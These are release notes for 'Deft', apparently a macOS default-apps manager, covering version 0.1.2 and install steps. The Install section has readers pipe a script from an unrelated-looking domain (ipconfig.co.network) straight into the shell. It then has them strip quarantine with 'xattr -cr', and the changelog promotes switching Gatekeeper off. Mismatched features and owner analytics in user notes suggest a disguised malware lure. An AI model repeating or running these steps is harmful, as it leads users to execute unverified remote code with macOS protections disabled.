# Deft release notes

Newest first. Downloads: https://github.com/JKS-sys/Deft-23-sep-2026-releases/releases/latest · https://ipconfig.co.network/deft

## Deft 0.1.2 — 16 Nov 2026

- Gatekeeper: a new page (⌘7) for “app can’t be opened”, “is damaged” and “cannot verify the developer”. Choose or drop an app to see whether it opens, its signature and its quarantine flag, then Allow it, Self-sign it, or both — with the exact commands in a log. Turn Gatekeeper off and back on; opens Privacy & Security when macOS 15 needs the last click; installs the Command Line Tools.

- Overview: a new first page — a donut of which apps open the most types, how covered each category is, a health score ring and your changes over the last 14 days.
- Changed while Deft was closed: Deft never runs in the background, so at each start it shows every default that something else moved since your last visit, with Put back, Keep, Put all back and Keep all.
- Quick defaults: web browser, email, PDF, images, video, music, plain text and archives — one picker each, right on Overview.
- No more permission questions: Deft no longer reads apps kept in Desktop, Documents, Downloads, iCloud or on other disks, so macOS has nothing to ask about; the installer script now leaves Deft owned by you, so updates never ask for the administrator password.
- Log boxes: a drawn icon on every line that draws itself, a coloured share strip (steps, done, warnings, problems), a moving status glyph, count chips that filter the lines, click any line to copy it, and a different sound and animation for a log that ended well, with warnings or with problems.
- Nothing overlaps however small the window gets — checked automatically on every page at five sizes from 1180×780 down to 380×300, in both themes.
- Faster start: only File Types loads with the window; every other page and dialog is its own small file, warmed up while the window is idle (the first file is a third of its old size).
- More colour for quick reading: prices, version numbers, folders, app identifiers, web addresses and words like “healthy”, “gone” and “put back” each have their own colour — and still no pink.
- 13 new sounds, each with its own self-drawing animation: Overview, Put back, Keep, drift notice, world map, country, analytics, three log endings, log filter, copy a line, quick defaults.
- Owner Panel → Analytics: a dot world map with a pulsing bubble per country, top countries, last seen over 30 days, new installs, macOS and Deft versions, Free and Pro, monthly and yearly income from subscriptions, codes and open crashes by version. Click a country to filter Installs.

### Install

Deft is a Mac app (Apple silicon — M1 and later). One download: `Deft_<version>_aarch64.dmg`.

- **With Pour:** `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask deft`
- **By hand:** open the DMG and drag Deft into Applications. First launch: `xattr -cr /Applications/Deft.app` (Deft is self-signed, not notarized).
- Per-app volume and the equaliser need macOS 14.4 or later.
- Earlier Windows, Linux, ChromeOS, FreeBSD and Intel Mac builds stay on the releases page but are no longer updated.
